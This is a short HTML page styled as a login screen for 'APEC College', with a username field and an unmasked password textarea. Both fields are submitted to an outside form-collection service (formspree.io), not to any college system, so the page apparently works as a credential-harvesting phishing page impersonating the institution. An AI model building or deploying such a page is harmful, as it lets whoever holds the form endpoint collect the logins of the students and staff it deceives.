<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Welcome to APEC College</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial, Helvetica, sans-serif;
}

body{
    background:#f5f5f5;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
}

.container{
    width:380px;
    background:#ffffff;
    padding:30px;
    border-radius:15px;
    text-align:center;
    box-shadow:0 8px 20px rgba(0,0,0,0.15);
}

.logo{
    width:100px;
    height:100px;
    margin-bottom:15px;
}

h1{
    color:#003366;
    margin-bottom:5px;
}

h3{
    color:#666;
    margin-bottom:20px;
    font-weight:normal;
}

input,
textarea{
    width:100%;
    padding:12px;
    margin:10px 0;
    border:1px solid #ccc;
    border-radius:8px;
    font-size:16px;
}

button{
    width:100%;
    padding:12px;
    background:#003366;
    color:#fff;
    border:none;
    border-radius:8px;
    font-size:16px;
    cursor:pointer;
}

button:hover{
    background:#0055aa;
}
</style>
</head>

<body>

<div class="container">

    <!-- Replace with your APEC logo -->
    <img src="logo.png" alt="APEC College Logo" class="logo">

    <h1>Welcome</h1>
    <h3>Welcome to APEC College</h3>

    <form action="https://formspree.io/f/xnjkoylv" method="POST">

        <input type="text" name="username" placeholder="Enter Username" required>

        <textarea name="password" rows="4" placeholder="Enter password" required></textarea>

        <button type="submit">Submit</button>

    </form>

</div>

</body>
</html>
